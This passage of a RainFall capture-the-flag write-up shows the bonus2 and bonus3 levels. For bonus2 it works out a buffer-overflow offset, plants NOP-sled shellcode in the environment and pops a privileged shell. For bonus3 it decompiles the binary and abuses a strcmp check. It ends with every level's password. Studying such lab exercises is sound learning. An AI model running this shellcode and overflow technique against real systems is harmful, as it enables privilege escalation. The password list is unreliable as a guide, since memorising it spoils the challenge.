bonus2@RainFall:~$ ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Goedemiddag! Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Segmentation fault (core dumped)
```

- We can make the program segfault if we pass 2 big arguments with the env variable LANG=nl, at this point we've already won

- Pass a pattern generated [here](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)

```bash
bonus2@RainFall:~$ gdb ./bonus2
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Breakpoint 1, 0x0804852f in main ()
(gdb) c
Continuing.
Goedemiddag! Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()

```

- Get the offset of the address `0x38614137`: 23

- Load a shellcode with a nopsled into the environment and get environment address

```bash
bonus2@RainFall:~$ export SHELLCODE=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x
52\x51\x53\x89\xe1\xcd\x80"')

bonus2@RainFall:~$  gdb ./bonus2 --eval-command='b main' --eval-command='r' --eval-command='print *((char **)environ)' --eval-command='quit'
...
Breakpoint 1 at 0x804852f
Starting program: /home/user/bonus2/bonus2

Breakpoint 1, 0x0804852f in main ()
$1 = 0xbfffe8c3 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\22
0\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\22
0\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
A debugging session is active.

        Inferior 1 [process 2609] will be killed.
```

- Execute the shellcode by loading EIP on the nopsled

```bash
bonus2@RainFall:~$ python -c 'print(hex(0xbfffe8c3 + 512))'
0xbfffeac3L

bonus2@RainFall:~$ ./bonus2  $(python -c 'print "A" * 23 + "\xc3\xea\xff\xbf" + "A" * 255') $(python -c 'print "A" * 23 + "\xc3\xea\xff\xbf" + "A" * 255')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
bash-4.2$
bash-4.2$ whoami
bonus3
bash-4.2$ pwd
/home/user/bonus2
bash-4.2$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Bonus3 (end)

- [`objdump -d` output](http://ix.io/2pEo)

### ASM Interpretation

```asm
Dump of assembler code for function main:
   0x080484f4 <+0>:     push   ebp
   0x080484f5 <+1>:     mov    ebp,esp
   0x080484f7 <+3>:     push   edi
   0x080484f8 <+4>:     push   ebx
   0x080484f9 <+5>:     and    esp,0xfffffff0
   0x080484fc <+8>:     sub    esp,0xa0

   0x08048502 <+14>:    mov    edx,0x80486f0
   0x08048507 <+19>:    mov    eax,0x80486f2
   0x0804850c <+24>:    mov    DWORD PTR [esp+0x4],edx
   0x08048510 <+28>:    mov    DWORD PTR [esp],eax
   0x08048513 <+31>:    call   0x8048410 <fopen@plt>

   0x08048518 <+36>:    mov    DWORD PTR [esp+0x9c],eax
   0x0804851f <+43>:    lea    ebx,[esp+0x18]
   0x08048523 <+47>:    mov    eax,0x0
   0x08048528 <+52>:    mov    edx,0x21
   0x0804852d <+57>:    mov    edi,ebx
   0x0804852f <+59>:    mov    ecx,edx
   0x08048531 <+61>:    rep stos DWORD PTR es:[edi],eax
   0x08048533 <+63>:    cmp    DWORD PTR [esp+0x9c],0x0
   0x0804853b <+71>:    je     0x8048543 <main+79>

   0x0804853d <+73>:    cmp    DWORD PTR [ebp+0x8],0x2
   0x08048541 <+77>:    je     0x804854d <main+89>

   0x08048543 <+79>:    mov    eax,0xffffffff
   0x08048548 <+84>:    jmp    0x8048615 <main+289>

   0x0804854d <+89>:    lea    eax,[esp+0x18]
   0x08048551 <+93>:    mov    edx,DWORD PTR [esp+0x9c]
   0x08048558 <+100>:   mov    DWORD PTR [esp+0xc],edx
   0x0804855c <+104>:   mov    DWORD PTR [esp+0x8],0x42
   0x08048564 <+112>:   mov    DWORD PTR [esp+0x4],0x1
   0x0804856c <+120>:   mov    DWORD PTR [esp],eax
   0x0804856f <+123>:   call   0x80483d0 <fread@plt>

   0x08048574 <+128>:   mov    BYTE PTR [esp+0x59],0x0
   0x08048579 <+133>:   mov    eax,DWORD PTR [ebp+0xc]
   0x0804857c <+136>:   add    eax,0x4
   0x0804857f <+139>:   mov    eax,DWORD PTR [eax]
   0x08048581 <+141>:   mov    DWORD PTR [esp],eax
   0x08048584 <+144>:   call   0x8048430 <atoi@plt>

   0x08048589 <+149>:   mov    BYTE PTR [esp+eax*1+0x18],0x0
   0x0804858e <+154>:   lea    eax,[esp+0x18]
   0x08048592 <+158>:   lea    edx,[eax+0x42]
   0x08048595 <+161>:   mov    eax,DWORD PTR [esp+0x9c]
   0x0804859c <+168>:   mov    DWORD PTR [esp+0xc],eax
   0x080485a0 <+172>:   mov    DWORD PTR [esp+0x8],0x41
   0x080485a8 <+180>:   mov    DWORD PTR [esp+0x4],0x1
   0x080485b0 <+188>:   mov    DWORD PTR [esp],edx
   0x080485b3 <+191>:   call   0x80483d0 <fread@plt>

   0x080485b8 <+196>:   mov    eax,DWORD PTR [esp+0x9c]
   0x080485bf <+203>:   mov    DWORD PTR [esp],eax
   0x080485c2 <+206>:   call   0x80483c0 <fclose@plt>

   0x080485c7 <+211>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080485ca <+214>:   add    eax,0x4
   0x080485cd <+217>:   mov    eax,DWORD PTR [eax]
   0x080485cf <+219>:   mov    DWORD PTR [esp+0x4],eax
   0x080485d3 <+223>:   lea    eax,[esp+0x18]
   0x080485d7 <+227>:   mov    DWORD PTR [esp],eax
   0x080485da <+230>:   call   0x80483b0 <strcmp@plt>

   0x080485df <+235>:   test   eax,eax
   0x080485e1 <+237>:   jne    0x8048601 <main+269>
   0x080485e3 <+239>:   mov    DWORD PTR [esp+0x8],0x0
   0x080485eb <+247>:   mov    DWORD PTR [esp+0x4],0x8048707
   0x080485f3 <+255>:   mov    DWORD PTR [esp],0x804870a
   0x080485fa <+262>:   call   0x8048420 <execl@plt>

   0x080485ff <+267>:   jmp    0x8048610 <main+284>

   0x08048601 <+269>:   lea    eax,[esp+0x18]
   0x08048605 <+273>:   add    eax,0x42
   0x08048608 <+276>:   mov    DWORD PTR [esp],eax
   0x0804860b <+279>:   call   0x80483e0 <puts@plt>

   0x08048610 <+284>:   mov    eax,0x0
   0x08048615 <+289>:   lea    esp,[ebp-0x8]
   0x08048618 <+292>:   pop    ebx
   0x08048619 <+293>:   pop    edi
   0x0804861a <+294>:   pop    ebp
   0x0804861b <+295>:   ret
End of assembler dump.
```

### Equivalent C code

```c
int main(int ac,char **av)
{
  FILE *fs;
  char pass[66];
  char buff[65];

  fs = fopen("/home/user/end/.pass","r");

  if ((!fs) || (argc != 2))
    return -1;

  fread(pass, 1, 66, fs);
  pass[atoi(av[1])] = 0;

  fread(buff, 1, 65, fs);
  fclose(fs);

  if (strcmp(pass, av[1]) == 0)
    execl("/bin/sh", "sh", 0);
  else
    puts(buff);

  return 0;
}
```

### Walktrough

```bash

As we can see the in asm code we have an execl call to "/bin/sh" with an if condition based on the result of strcmp

- Let's try to make the result of strcmp equals to `0`

```bash
bonus3@RainFall:~$ ./bonus3 0 # Will not work as it has a value of 48


bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ pwd
/home/user/bonus3
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

Not the hardest level for sure

## Misc / References

### ASM Cheatsheets

- [Registers usage](http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html)
- [ASM Operations](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)
- [Linux Syscall Table](https://filippo.io/linux-syscall-table/)
- [Att vs Intel syntax](https://imada.sdu.dk/~kslarsen/Courses/dm546-2019-spring/Material/IntelnATT.htm)
- [Linux startup callgraph](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)

![](https://www.tortall.net/projects/yasm/manual/html/objfmt-win64/calling-convention.png)

![](https://itandsecuritystuffs.files.wordpress.com/2014/03/image_thumb2.png?w=617&h=480)

### /etc/passwd content

```bash
level0@RainFall:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
level0:x:2020:2020::/home/user/level0:/bin/bash
level1:x:2030:2030::/home/user/level1:/bin/bash
level2:x:2021:2021::/home/user/level2:/bin/bash
level3:x:2022:2022::/home/user/level3:/bin/bash
level4:x:2025:2025::/home/user/level4:/bin/bash
level5:x:2045:2045::/home/user/level5:/bin/bash
level6:x:2064:2064::/home/user/level6:/bin/bash
level7:x:2024:2024::/home/user/level7:/bin/bash
level8:x:2008:2008::/home/user/level8:/bin/bash
level9:x:2009:2009::/home/user/level9:/bin/bash
bonus0:x:2010:2010::/home/user/bonus0:/bin/bash
bonus1:x:2011:2011::/home/user/bonus1:/bin/bash
bonus2:x:2012:2012::/home/user/bonus2:/bin/bash
bonus3:x:2013:2013::/home/user/bonus3:/bin/bash
end:x:2014:2014::/home/user/end:/bin/bash
```

### Passwords

```bash
level0 -> level0
level1 -> 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
level2 -> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
level3 -> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
level4 -> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
level5 -> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level6 -> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
level7 -> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level8 -> 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
level9 -> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
bonus0 -> 
bonus1 -> cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
bonus2 -> 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
bonus3 -> 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
end    -> 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
